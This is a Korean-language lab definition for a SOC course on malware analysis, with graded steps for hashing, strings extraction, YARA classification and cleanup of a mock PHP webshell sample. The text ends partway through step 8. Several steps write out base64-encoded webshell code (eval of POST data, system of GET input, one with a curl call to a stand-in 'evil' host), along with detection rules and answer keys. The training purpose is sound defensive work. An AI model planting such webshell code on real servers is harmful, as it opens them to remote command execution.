lab_id: standalone-soc-adv-week09
title: "악성코드 분석 — 정적·동적 분석과 YARA 분류"
version: standalone-soc-adv
course: soc-adv
week: 9
description: |
  SOC 고급 W09 — 악성코드 분석. 메모리/디스크에서 확보한 검체를 안전하게 분석한다. 정적 분석(파일 타입·
  문자열·해시), YARA 다중 룰 분류, 행위 지표(동적) 식별까지. el34-attacker yara/strings/sha256sum 사용.
  검체는 실습용 모의 웹셸(base64 주입, self-clean). 인가된 실습만. 명령은 el34 호스트에서. 신규 설치 없음.
difficulty: hard
duration_minutes: 180
prerequisites:
  - "soc-adv W04(YARA 진탐/오탐0)·W08(메모리 검체 복원) 통과"
  - "el34 호스트 SSH + docker exec, el34-attacker yara 4.x"
  - "lecture §2(정적/동적) §3(YARA 분류) §4(안전 취급) 숙지"
objectives:
  - "정적 분석(타입·문자열·해시)으로 검체 특성 도출"
  - "YARA 다중 룰로 분류·패밀리 식별"
  - "행위 지표(동적)와 안전한 검체 취급 이해"
pass_threshold: 0.7
steps:

  - order: 1
    instruction: |
      ## 🎯 분석 도구 확인
      **실습 의미:** 악성코드 분석은 분류(yara)·문자열(strings)·해시(sha256sum)·타입(file) 도구로 한다 — 먼저 분석가 도구가 갖춰졌는지 확인한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # yara 버전 출력 (분류 엔진 확인)
        yara --version
        # strings·sha256sum·file이 모두 있으면 분석가 도구 준비 완료 마커
        command -v strings sha256sum file >/dev/null 2>&1 && echo analyst_ready
      '
      ```
      ## ✅ 합격 기준
      `analyst_ready` 출력 시 통과. **근거:** 마커는 yara·strings·sha256sum·file이 모두 존재할 때만 찍히므로, 정적·분류 분석 도구가 준비됐음을 뜻한다.
    hint: '도구 확인'
    category: survey
    points: 10
    answer: |
      docker exec el34-attacker sh -c '
        # yara 버전 출력 (분류 엔진 확인)
        yara --version
        # strings·sha256sum·file 모두 있으면 준비 완료 마커
        command -v strings sha256sum file >/dev/null 2>&1 && echo analyst_ready
      '
    answer_detail: "악성코드 분석 도구 = yara(분류)·strings(문자열)·sha256sum(해시)·file(타입). el34-attacker 상주."
    verify:
      type: output_contains
      expect: 'analyst_ready'
      field: stdout
      semantic: {intent: "도구 확인", success_criteria: ["yara/strings"], acceptable_methods: ["**[OSS] yara (권장)**"]}
    target_vm: attacker

  - order: 2
    instruction: |
      ## 🎯 검체 준비 (격리된 분석 디렉터리)
      **실습 의미:** 검체는 격리 디렉터리에서만 다룬다 — 실습용 모의 웹셸을 base64로 안전히 생성한다(실행 금지, 분석 전용).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 격리 분석 디렉터리 생성
        mkdir -p /tmp/mw09
        # 실습용 모의 웹셸 검체를 base64로 생성 (절대 실행하지 않고 분석만)
        echo "PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgLy8gbWFsd2FyZQ==" | base64 -d > /tmp/mw09/sample.bin
        # 검체 바이트 크기 출력
        wc -c < /tmp/mw09/sample.bin
        # 검체 파일이 실제 생겼으면 준비 완료 마커
        [ -s /tmp/mw09/sample.bin ] && echo sample_staged
      '
      ```
      ## ✅ 합격 기준
      `sample_staged`(과 검체 크기)가 출력되면 통과. **근거:** 마커는 격리 디렉터리에 검체가 실제 생성됐을 때만 찍히므로, 안전한 분석 준비가 됐음을 뜻한다.
    hint: '검체 준비'
    category: manipulation
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 격리 분석 디렉터리 생성
        mkdir -p /tmp/mw09
        # 모의 웹셸 검체 생성 (실행 금지, 분석 전용)
        echo "PD9waHAgQGV2YWwoJF9QT1NUWydjJ10pOyBzeXN0ZW0oJF9HRVRbJ2NtZCddKTsgLy8gbWFsd2FyZQ==" | base64 -d > /tmp/mw09/sample.bin
        # 검체 크기 출력
        wc -c < /tmp/mw09/sample.bin
        # 검체가 생겼으면 마커
        [ -s /tmp/mw09/sample.bin ] && echo sample_staged
      '
    answer_detail: "검체 준비 = 격리 디렉터리에 모의 웹셸 생성(base64, 실행 금지). 8단계 끝에 self-clean."
    verify:
      type: output_contains
      expect: 'sample_staged'
      field: stdout
      semantic: {intent: "검체 준비", success_criteria: ["격리"], acceptable_methods: ["**[OSS] 격리 디렉터리 (권장)**"]}
    target_vm: attacker

  - order: 3
    instruction: |
      ## 🎯 정적 분석 ① — 해시·타입
      **실습 의미:** 검체를 실행하지 않고 식별한다 — SHA-256(고유 지문, CTI 조회용)과 file 타입(무엇인가)으로 검체를 특정한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        cd /tmp/mw09
        # SHA-256 앞 16자 = 검체 고유 지문 (VirusTotal/OpenCTI 조회·IOC 공유용)
        sha256sum sample.bin | cut -c1-16
        # file = 매직바이트로 파일 타입 추정
        file sample.bin
        # 해시·타입을 식별했으면 마커
        [ -f sample.bin ] && echo static_id_done
      '
      ```
      ## ✅ 합격 기준
      `static_id_done`(과 해시·타입)이 출력되면 통과. **근거:** 마커는 검체에 해시·타입 식별을 실제 수행했을 때 찍히므로, 실행 없이 검체를 특정하는 정적 분석의 첫 단계가 완료됐음을 뜻한다.
    hint: '해시/타입'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        cd /tmp/mw09
        # SHA-256 앞 16자 (고유 지문, CTI 조회)
        sha256sum sample.bin | cut -c1-16
        # file = 타입 추정
        file sample.bin
        # 식별했으면 마커
        [ -f sample.bin ] && echo static_id_done
      '
    answer_detail: "정적 식별 = SHA-256(지문, CTI 조회)+file(타입). 검체를 실행하지 않고 특성 도출."
    verify:
      type: output_contains
      expect: 'static_id_done'
      field: stdout
      semantic: {intent: "해시/타입", success_criteria: ["해시"], acceptable_methods: ["**[OSS] sha256sum (권장)**"]}
    target_vm: attacker

  - order: 4
    instruction: |
      ## 🎯 정적 분석 ② — 문자열 추출
      **실습 의미:** strings로 검체 속 사람이 읽을 수 있는 문자열을 뽑아 명령·함수명 등 행위 단서를 얻는다 — 문자열은 가장 빠른 행위 단서다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 검체에서 의심 키워드(eval/system/php/cmd) 문자열을 추출해 본다
        strings /tmp/mw09/sample.bin | grep -iE "eval|system|php|cmd" | head
        # 의심 키워드가 실제로 나오면 마커 (eval()/system()=원격 코드 실행 웹셸 의심)
        strings /tmp/mw09/sample.bin | grep -qiE "eval|system|php|cmd" && echo strings_done
      '
      ```
      ## ✅ 합격 기준
      `strings_done`(과 키워드)이 출력되면 통과. **근거:** 마커는 검체에서 의심 키워드가 실제 추출될 때만 찍히므로, 원격 코드 실행 웹셸의 행위 단서를 확보했음을 뜻한다.
    hint: 'strings'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 의심 키워드 문자열 추출
        strings /tmp/mw09/sample.bin | grep -iE "eval|system|php|cmd" | head
        # 키워드가 실제 나오면 마커
        strings /tmp/mw09/sample.bin | grep -qiE "eval|system|php|cmd" && echo strings_done
      '
    answer_detail: "문자열 추출 = strings로 검체 내 명령·함수명 도출. eval/system=웹셸 의심 단서."
    verify:
      type: output_contains
      expect: 'strings_done'
      field: stdout
      semantic: {intent: "문자열", success_criteria: ["키워드 추출"], acceptable_methods: ["**[OSS] strings (권장)**"]}
    target_vm: attacker

  - order: 5
    instruction: |
      ## 🎯 YARA 다중 룰 분류
      **실습 의미:** 여러 YARA 룰로 검체를 스캔하면 매치된 룰명이 곧 분류 결과가 된다(W04는 진탐, 여기선 패밀리 분류 관점).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 분류용 YARA 룰 생성 (eval($_POST 또는 system($_GET 포함 → webshell_php로 분류)
        printf "cnVsZSB3ZWJzaGVsbF9waHAgeyBzdHJpbmdzOiAkYSA9IFwiZXZhbCgkX1BPU1RcIiAkYiA9IFwic3lzdGVtKCRfR0VUXCIgY29uZGl0aW9uOiAkYSBvciAkYiB9" | base64 -d > /tmp/mw09/r.yar
        # 룰로 검체를 스캔 → 매치된 룰명(webshell_php)이 분류 결과로 출력됨
        yara /tmp/mw09/r.yar /tmp/mw09/sample.bin
      '
      ```
      ## ✅ 합격 기준
      `webshell_php`(룰 매치)가 출력되면 통과. **근거:** 매치된 룰명이 출력됐다는 건 검체가 그 패밀리로 실제 분류됐다는 뜻이다.
    hint: 'YARA 분류'
    category: analysis
    points: 14
    answer: |
      docker exec el34-attacker sh -c '
        # 분류용 YARA 룰 생성
        printf "cnVsZSB3ZWJzaGVsbF9waHAgeyBzdHJpbmdzOiAkYSA9IFwiZXZhbCgkX1BPU1RcIiAkYiA9IFwic3lzdGVtKCRfR0VUXCIgY29uZGl0aW9uOiAkYSBvciAkYiB9" | base64 -d > /tmp/mw09/r.yar
        # 룰로 검체 스캔 → 매치 룰명이 분류 결과
        yara /tmp/mw09/r.yar /tmp/mw09/sample.bin
      '
    answer_detail: "YARA 분류 = 룰 매치로 패밀리 식별. 매치된 룰명이 분류 결과. W04 진탐을 분류로 확장."
    verify:
      type: output_contains
      expect: 'webshell_php'
      field: stdout
      semantic: {intent: "YARA 분류", success_criteria: ["룰 매치"], acceptable_methods: ["**[OSS] yara (권장)**"]}
    target_vm: attacker

  - order: 6
    instruction: |
      ## 🎯 행위 지표 추출 (동적 분석 단서)
      **실습 의미:** 동적 분석은 격리 샌드박스에서 실행해 행위를 관찰하지만, 그 전에 strings로 코드실행·네트워크 함수 같은 행위 지표를 미리 뽑아낸다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 네트워크 행위가 있는 모의 검체 생성 (system()+curl http)
        echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyBjdXJsIGh0dHA6Ly9ldmlsLmM= | base64 -d > /tmp/dyn09
        # strings로 행위 지표(코드실행·네트워크 함수)를 추출해 본다
        strings /tmp/dyn09 | grep -iE "system|exec|curl|http" | head
        # 코드실행·네트워크 지표가 실제 나오면 마커 (동적 시 파일/프로세스/C2 관찰) + 정리
        strings /tmp/dyn09 | grep -qiE "system|exec|curl" && echo "코드실행·네트워크 행위 지표 발견(동적 시 파일/프로세스/C2 관찰)" && echo behavior_analyzed
        rm -f /tmp/dyn09
      '
      ```
      ## ✅ 합격 기준
      `behavior_analyzed` 출력 시 통과. **근거:** 마커는 검체에서 코드실행·네트워크 행위 지표가 실제 추출될 때만 찍히므로, 정적 단계에서 동적 행위 단서를 확보했음을 뜻한다.
    hint: '동적 분석'
    category: analysis
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 네트워크 행위가 있는 모의 검체 생성
        echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyBjdXJsIGh0dHA6Ly9ldmlsLmM= | base64 -d > /tmp/dyn09
        # strings로 행위 지표 추출
        strings /tmp/dyn09 | grep -iE "system|exec|curl|http" | head
        # 지표가 실제 나오면 마커 + 정리
        strings /tmp/dyn09 | grep -qiE "system|exec|curl" && echo "코드실행·네트워크 행위 지표 발견(동적 시 파일/프로세스/C2 관찰)" && echo behavior_analyzed
        rm -f /tmp/dyn09
      '
    answer_detail: "행위 지표 = strings로 검체의 실행/네트워크 지표 실추출. 가짜 echo 아닌 실추출. 동적은 샌드박스 병행."
    verify:
      type: output_contains
      expect: 'behavior_analyzed'
      field: stdout
      semantic: {intent: "행위 지표", success_criteria: ["지표 실추출"], acceptable_methods: ["**[OSS] strings (권장)**"]}
    target_vm: attacker

  - order: 7
    instruction: |
      ## 🎯 안전한 검체 취급 + 정리
      **실습 의미:** 검체는 절대 운영망에서 실행하지 않고 분석 후 격리 삭제한다 — 실수로도 운영 감염을 일으키지 않기 위함이다(self-clean).
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 분석이 끝난 검체 디렉터리를 격리 삭제 (운영망 유입 방지)
        rm -rf /tmp/mw09
        # 검체 디렉터리가 실제로 사라졌으면 안전 취급 완료 마커
        [ ! -d /tmp/mw09 ] && echo handling_done
      '
      ```
      ## ✅ 합격 기준
      `handling_done` 출력 시 통과. **근거:** 마커는 검체 디렉터리가 실제 삭제됐을 때만 찍히므로, 분석 종료 후 안전한 정리(self-clean)가 됐음을 뜻한다.
    hint: '안전 취급'
    category: report
    points: 12
    answer: |
      docker exec el34-attacker sh -c '
        # 검체 디렉터리 격리 삭제 (self-clean)
        rm -rf /tmp/mw09
        # 실제로 사라졌으면 마커
        [ ! -d /tmp/mw09 ] && echo handling_done
      '
    answer_detail: "안전 취급 = 격리망·실행금지·암호화보관·해시공유. 분석 후 self-clean. 실수로도 운영 감염 금지."
    verify:
      type: output_contains
      expect: 'handling_done'
      field: stdout
      semantic: {intent: "안전 취급", success_criteria: ["격리/정리"], acceptable_methods: ["**[관리적] 안전 취급 (권장)**"]}
    target_vm: attacker

  - order: 8
    instruction: |
      ## 🎯 악성코드 분석 보고서 작성
      **실습 의미:** 앞 단계의 실측(해시·strings 키워드 수)을 인용한 보고서로 정리한다 — 추측이 아닌 분석 결과를 근거로 검체 정체를 보고한다.
      ## 💻 실행 명령 (한 줄씩 따라 실행)
      ```bash
      docker exec el34-attacker sh -c '
        # 보고서 근거: 검체 샘플을 다시 만들어 해시·strings 키워드 수를 실측
        echo PD9waHAgc3lzdGVtKCRfR0VUWyJjIl0pOyA/Pgo= | base64 -d > /tmp/rep09
        H=$(sha256sum /tmp/rep09 | cut -c1-16)
        S=$(strings /tmp/rep09 | grep -ciE "system|eval")
        # 실측 해시·키워드 수를 인용한 보고서 출력 (본문 상세는 학생이 보강)
        echo "# W09 악성코드 분석 보고서 — SHA256 ${H}·의심키워드 ${S}건·YARA(webshell_php)분류·안전취급/IOC환류"
        # 실측 인용 보고서면 완료 마커 + 정리
        [ -n "$H" ] && echo malware_report_done
        rm -f /tmp/rep09
      '
      ```
      ## ✅ 합격 기준
